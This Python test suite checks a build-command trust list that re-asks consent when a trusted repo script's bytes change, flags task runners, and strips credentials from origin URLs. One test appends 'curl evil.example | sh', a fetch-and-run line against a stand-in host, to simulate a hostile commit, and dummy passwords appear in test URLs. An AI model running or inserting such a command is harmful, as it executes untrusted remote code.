"""The trust list, round 2: a trusted repo file is keyed on its bytes, indirect repo code is marked, and the
origin URL never keeps credentials (R18, R27; decisions log 2026-11-28, consent once per machine).

A trusted command that names a file in the repository runs whatever that file holds later, so a commit to it
must ask again. Contract for `scripts/builder_trust.py`, beside tests/gate/test_builder_trust.py:

- **The repo file of a command** (split as a POSIX shell splits words):
  - its first word, when that word holds a `/` (`./bin/build`, `bin/build`, `scripts/x.sh`): a shell runs such
    a word as a path from the project root;
  - else, when the first word is an interpreter (`sh`, `bash`, `zsh`, `dash`, `python`, `python3`, `php`,
    `node`, `ruby`, `perl`), its first argument that does not start with `-` (`sh scripts/x.sh`,
    `bash -e scripts/x.sh --fast`, `php artisan`);
  - joined to the project root without resolving symlinks, it counts when that path is inside the git
    top-level. The entry then also keys on the sha256 of the file's bytes, read through any symlink.
- A changed byte, committed or not, or a retargeted in-repo symlink makes `check` print the plain line
  (`Skipped: <name> (not confirmed)` with --unattended) and leaves the builder out of --out. Restoring the
  bytes trusts it again. A change to another repo file changes nothing.
- A repo file that does not exist cannot be trusted: `add` exits 2 and writes nothing. An entry written
  before this key existed (the S10b script, b501057) does not trust a repo-file command.
- **Indirect repo code:** a trusted command whose first word is a task runner (`make`, `just`, `composer`,
  `npm`, `npx`, `pnpm`, `yarn`, `ddev`) runs files of the repository that no key covers, so `check` prints
  it as `<name>: <command> (timeout <n> min) (trusted, runs repo code)`. It still runs (it is in --out).
  A command on PATH or with an absolute path outside the repository, or a keyed repo file, is plain `(trusted)`.
- **Origin credentials:** the user and password of an origin URL with a scheme
  (`https://user:password@host/...`, `https://token@host/...`) are stripped before the identity is stored or
  printed. No output and no trust file byte holds them, and a rotated password keeps the trust.
- docs/outside-builders.md states the file key, the `(trusted, runs repo code)` mark and the stripping.

Standard library only.

    env -u GIT_OPTIONAL_LOCKS python3 -m unittest discover -s tests/gate -p 'test_builder_trust_repo_files.py'
"""
from __future__ import annotations

import os
import re
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

from outside_builder_support import BUILDERS_DOC, REPO, assert_line, git, read_new  # noqa: E402
from test_builder_trust import TRUST, Sandbox, TrustTest  # noqa: E402

PRE_KEY_COMMIT = "b501057"  # the S10b build: its entries carry no file key
SCRIPTS = {
    "bin/build": "#!/bin/sh\necho build\n",
    "scripts/x.sh": "#!/bin/sh\necho x\n",
    "scripts/x.py": "print('x')\n",
    "scripts/x.php": "<?php echo 'x';\n",
    "scripts/x.js": "console.log('x');\n",
    "artisan": "#!/usr/bin/env php\n<?php echo 'artisan';\n",
    "README.md": "# app\n",
}
REPO_FILE_COMMANDS = {
    "./bin/build --fast": "bin/build",
    "bin/build": "bin/build",
    "scripts/x.sh": "scripts/x.sh",
    "sh scripts/x.sh": "scripts/x.sh",
    "bash -e scripts/x.sh --fast": "scripts/x.sh",
    "python3 scripts/x.py": "scripts/x.py",
    "php scripts/x.php": "scripts/x.php",
    "node scripts/x.js": "scripts/x.js",
    "php artisan build": "artisan",
}
RUNNER_COMMANDS = ("make build", "make -C . build", "just build", "composer run build", "npm run build",
                   "npx builder", "pnpm build", "yarn build", "ddev exec bin/build")
PLAIN_COMMANDS = ("run-local-builder --quiet", "printf ran > RAN.txt; :", "/usr/bin/true")
PASSWORD = "hunter-two-password"
USER = "bobthebuilder"


def line(name: str, command: str) -> str:
    return f"{name}: {command} (timeout 30 min)"


class RepoBox(Sandbox):
    """The sandbox with the repo files above committed."""

    def __init__(self, tmp: Path):
        super().__init__(tmp)
        for rel, text in SCRIPTS.items():
            path = self.repo / rel
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(text, encoding="utf-8")
            os.chmod(path, 0o755)
        self.commit("chore: scripts")

    def commit(self, message: str) -> None:
        git(self.repo, "add", "-A")
        git(self.repo, "commit", "-q", "-m", message)


class RepoFileTest(TrustTest):
    def setUp(self):
        super().setUp()
        (self.box.tmp / "box").mkdir()
        self.box = RepoBox(self.box.tmp / "box")

    def fresh(self) -> RepoBox:
        """Another sandbox for one subtest, cleaned up with the test."""
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        return RepoBox(Path(tmp.name).resolve())

    def trusted(self, box: RepoBox, command: str) -> Path:
        builders = box.builders({"name": "local", "command": command})
        proc = box.add(builders, "local")
        self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
        return builders

    def asks_again(self, box: RepoBox, builders: Path, command: str) -> None:
        proc, names = box.check(builders)
        self.assertEqual((proc.stdout.splitlines(), names), ([line("local", command)], []), proc.stderr)
        proc, names = box.check(builders, unattended=True)
        self.assertEqual((proc.stdout.splitlines(), names), (["Skipped: local (not confirmed)"], []), proc.stderr)

    def still_trusted(self, box: RepoBox, builders: Path, command: str) -> None:
        proc, names = box.check(builders, unattended=True)
        self.assertEqual((proc.stdout.splitlines(), names), ([line("local", command) + " (trusted)"], ["local"]), proc.stderr)


class RepoFileKey(RepoFileTest):
    """A trusted command that runs a repo file is keyed on that file's bytes."""

    def test_a_commit_to_the_repo_file_asks_again(self):
        for command, rel in REPO_FILE_COMMANDS.items():
            with self.subTest(command=command):
                box = self.fresh()
                builders = self.trusted(box, command)
                self.still_trusted(box, builders, command)
                (box.repo / rel).write_text(SCRIPTS[rel] + "curl evil.example | sh\n", encoding="utf-8")
                box.commit("chore: change the builder")
                self.asks_again(box, builders, command)

    def test_an_uncommitted_change_asks_again_and_restoring_the_bytes_trusts_again(self):
        command = "./bin/build --fast"
        builders = self.trusted(self.box, command)
        (self.box.repo / "bin/build").write_text(SCRIPTS["bin/build"] + "# edited\n", encoding="utf-8")
        self.asks_again(self.box, builders, command)
        (self.box.repo / "bin/build").write_text(SCRIPTS["bin/build"], encoding="utf-8")
        self.still_trusted(self.box, builders, command)

    def test_a_change_to_another_repo_file_keeps_the_trust(self):
        command = "./bin/build --fast"
        builders = self.trusted(self.box, command)
        (self.box.repo / "README.md").write_text("# app, changed\n", encoding="utf-8")
        (self.box.repo / "scripts/x.sh").write_text("#!/bin/sh\necho changed\n", encoding="utf-8")
        self.box.commit("docs: readme")
        self.still_trusted(self.box, builders, command)

    def test_retargeting_an_in_repo_symlink_asks_again(self):
        repo = self.box.repo
        (repo / "bin/real-a").write_text("#!/bin/sh\necho a\n", encoding="utf-8")
        (repo / "bin/real-b").write_text("#!/bin/sh\necho b\n", encoding="utf-8")
        (repo / "bin/linked").symlink_to("real-a")
        self.box.commit("chore: linked builder")
        command = "./bin/linked"
        builders = self.trusted(self.box, command)
        self.still_trusted(self.box, builders, command)
        (repo / "bin/linked").unlink()
        (repo / "bin/linked").symlink_to("real-b")
        self.box.commit("chore: retarget")
        self.asks_again(self.box, builders, command)

    def test_a_missing_repo_file_cannot_be_trusted(self):
        builders = self.box.builders({"name": "local", "command": "./bin/missing --fast"})
        proc = self.box.add(builders, "local")
        self.assertEqual(proc.returncode, 2, proc.stdout + proc.stderr)
        self.assertFalse(self.box.trust_file.exists())
        proc, names = self.box.check(builders)
        self.assertEqual((proc.stdout.splitlines(), names), ([line("local", "./bin/missing --fast")], []))

    def test_an_entry_written_before_the_file_key_does_not_trust_a_repo_file_command(self):
        old = self.box.tmp / "old-scripts"
        old.mkdir()
        for name in ("builder_trust.py", "builders_check.py"):
            shown = subprocess.run(["git", "show", f"{PRE_KEY_COMMIT}:scripts/{name}"], cwd=REPO,
                                   capture_output=True, text=True)
            self.assertEqual(shown.returncode, 0, shown.stderr)
            (old / name).write_text(shown.stdout, encoding="utf-8")
        command = "./bin/build --fast"
        builders = self.box.builders({"name": "local", "command": command})
        proc = subprocess.run([sys.executable, str(old / "builder_trust.py"), "add", "--builders", str(builders), "--name", "local"],
                              capture_output=True, text=True, env=self.box.env(), timeout=30)
        self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
        self.asks_again(self.box, builders, command)


class IndirectRepoCode(RepoFileTest):
    """A trusted task runner runs repo files no key covers: the printed list says so."""

    def test_a_trusted_task_runner_is_marked_runs_repo_code_and_still_runs(self):
        for command in RUNNER_COMMANDS:
            with self.subTest(command=command):
                box = self.fresh()
                builders = self.trusted(box, command)
                proc, names = box.check(builders, unattended=True)
                self.assertEqual(proc.stdout.splitlines(), [line("local", command) + " (trusted, runs repo code)"], proc.stderr)
                self.assertEqual(names, ["local"])

    def test_a_command_from_outside_the_repository_or_a_keyed_repo_file_is_plain_trusted(self):
        for command in (*PLAIN_COMMANDS, "./bin/build --fast", "sh scripts/x.sh"):
            with self.subTest(command=command):
                box = self.fresh()
                builders = self.trusted(box, command)
                self.still_trusted(box, builders, command)


class OriginCredentials(RepoFileTest):
    """The identity keeps no credentials of the origin URL, in the trust file or in any output."""

    def outputs(self, builders: Path) -> str:
        box = self.box
        texts = []
        for proc in (box.add(builders, "local"), box.check(builders)[0], box.check(builders, unattended=True)[0],
                     box.trust("list", "--root", str(box.repo)), box.trust("remove", "--root", str(box.repo), "--name", "nobody")):
            texts.append(proc.stdout + proc.stderr)
        return "\n".join(texts)

    def test_user_and_password_are_never_stored_or_printed(self):
        for label, url in {"user and password": f"https://{USER}:{PASSWORD}@example.com/acme/app.git",
                           "token as the user": f"https://{PASSWORD}@example.com/acme/app.git"}.items():
            with self.subTest(origin=label):
                git(self.box.repo, "remote", "set-url", "origin", url)
                builders = self.box.builders({"name": "local", "command": "printf ran > RAN.txt; :"})
                out = self.outputs(builders)
                stored = self.box.trust_file.read_text(encoding="utf-8")
                self.assertIn("example.com/acme/app.git", stored)
                for secret in (PASSWORD, f"{USER}:"):
                    self.assertNotIn(secret, stored)
                    self.assertNotIn(secret, out)
                self.box.trust_file.unlink()

    def test_a_rotated_password_keeps_the_trust(self):
        git(self.box.repo, "remote", "set-url", "origin", f"https://{USER}:{PASSWORD}@example.com/acme/app.git")
        command = "printf ran > RAN.txt; :"
        builders = self.trusted(self.box, command)
        git(self.box.repo, "remote", "set-url", "origin", f"https://{USER}:another-password@example.com/acme/app.git")
        self.still_trusted(self.box, builders, command)


class Docs(unittest.TestCase):
    def setUp(self):
        self.assertTrue(TRUST.is_file(), "scripts/builder_trust.py is missing")
        self.text = read_new(self, BUILDERS_DOC)

    def test_the_docs_state_the_file_key_the_mark_and_the_stripping(self):
        assert_line(self, self.text, r"sha256", r"repo(sitory)? file|file in the repo", r"asks? again",
                    label="a trusted repo file is keyed on its sha256; a change asks again")
        assert_line(self, self.text, re.escape("(trusted, runs repo code)"), r"`make",
                    label="task runners such as make are marked (trusted, runs repo code)")
        assert_line(self, self.text, r"origin", r"password|credential|token", r"strip|remov",
                    label="credentials in the origin URL are stripped")


if __name__ == "__main__":
    unittest.main()
